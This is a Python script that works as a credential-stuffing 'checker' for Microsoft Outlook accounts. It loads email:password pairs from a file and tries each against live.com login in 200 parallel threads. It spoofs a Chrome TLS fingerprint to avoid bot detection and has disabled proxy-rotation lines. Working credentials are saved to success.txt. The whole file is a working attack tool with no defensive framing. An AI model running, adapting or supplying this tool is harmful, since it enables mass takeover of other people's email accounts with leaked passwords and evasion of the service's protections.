import tls_client
import json
import re
from loguru import logger
import urllib.parse
import random
from typing import Optional, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

class OutlookSessionManager:
    def __init__(self, username: str, password: str):
        self.username = username
        self.password = password
        self.session = tls_client.Session(
            client_identifier="chrome_103",
            random_tls_extension_order=True
        )
        #self.proxy = random.choice(open("proxy.txt", "r").readlines()).strip()
        #self.session.proxies = {'http': 'http://' + self.proxy.strip(), 'https': 'http://' + self.proxy.strip()}
        self.base_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }
        self.tokens = {}

    def _parse_value(self, source: str, start_pattern: str, end_pattern: str = None) -> Optional[str]:
        if end_pattern:
            match = re.search(f"{start_pattern}(.*?){end_pattern}", source)
            return match.group(1) if match else None
        else:
            match = re.search(f"{start_pattern}(.*)", source)
            return match.group(1) if match else None

    def initialize_session(self) -> Dict[str, str]:
        response = self.session.get(
            "https://outlook.live.com/owa/?nlp=1",
            headers=self.base_headers,
            allow_redirects=True
        )
        source = response.text
        self.tokens = {
            "url1": self._parse_value(source, "https://login.live.com/GetCredentialType.", "'"),
            "ppft": self._parse_value(source, 'name="PPFT" id="i0327" value="', '"'),
            "url2": self._parse_value(source, "https://login.live.com/ppsecure/post.srf", "'"),
            "uaid": self._parse_value(self._parse_value(source, "https://login.live.com/GetCredentialType.", "'"), "uaid=", "")
        }
        return self.tokens

    def perform_login(self) -> bool:
        cred_check_headers = {
            **self.base_headers,
            "Content-Type": "application/json",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/login.srf"
        }
        cred_check_data = {
            "username": self.username,
            "uaid": self.tokens["uaid"],
            "isOtherIdpSupported": True,
            "checkPhones": False,
            "isRemoteNGCSupported": True,
            "isCookieBannerShown": False,
            "isFidoSupported": True,
            "forceotclogin": False,
            "flowToken": self.tokens["ppft"]
        }
        response = self.session.post(
            f"https://login.live.com/GetCredentialType.{self.tokens['url1']}",
            headers=cred_check_headers,
            json=cred_check_data, allow_redirects=True
        )
        login_headers = {
            **self.base_headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/login.srf",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1"
        }
        login_data = {
            "login": self.username,
            "loginfmt": self.username,
            "passwd": self.password,
            "PPFT": self.tokens["ppft"],
            "type": "11",
            "PPSX": "Pa",
            "NewUser": "1",
            "LoginOptions": "3"
        }
        response = self.session.post(
            f"https://login.live.com/ppsecure/post.srf{self.tokens['url2']}",
            data=urllib.parse.urlencode(login_data),
            headers=login_headers,
            allow_redirects=True
        )
        return "__Host-MSAAUTH" in self.session.cookies

    def login(self) -> bool:
        try:
            self.initialize_session()
            return self.perform_login()
        except Exception as e:
            logger.error(f"Error logging in with {self.username}: {str(e)}")
            return False

def load_accounts(file_path: str) -> list:
    with open(file_path, "r") as f:
        return [line.strip().split(':') for line in f.readlines()]

def save_checked_account(email: str, password: str):
    with open("success.txt", "a") as f:
        f.write(email + ":" + password + "\n")

def login_account(email: str, password: str) -> str:
    try:
        outlook = OutlookSessionManager(email, password)
        if outlook.login():
            save_checked_account(email, password)
            return f"Login successful for: {email}:{password}"
        else:
            return f"Login failed for: {email}:{password}"
    except Exception as e:
        return f"Error processing {email}: {str(e)}"
        
accounts = load_accounts("accounts.txt")
with ThreadPoolExecutor(max_workers=200) as executor:
    future_to_account = {executor.submit(login_account, email, password): (email, password) for email, password in accounts}
    for future in as_completed(future_to_account):
        email, password = future_to_account[future]
        try:
            result = future.result()
            if 'success' in result:
                logger.success(result)
            else:
                logger.error(result)
        except Exception as e:
            logger.error(f"Error processing {email}: {str(e)}")
            pass
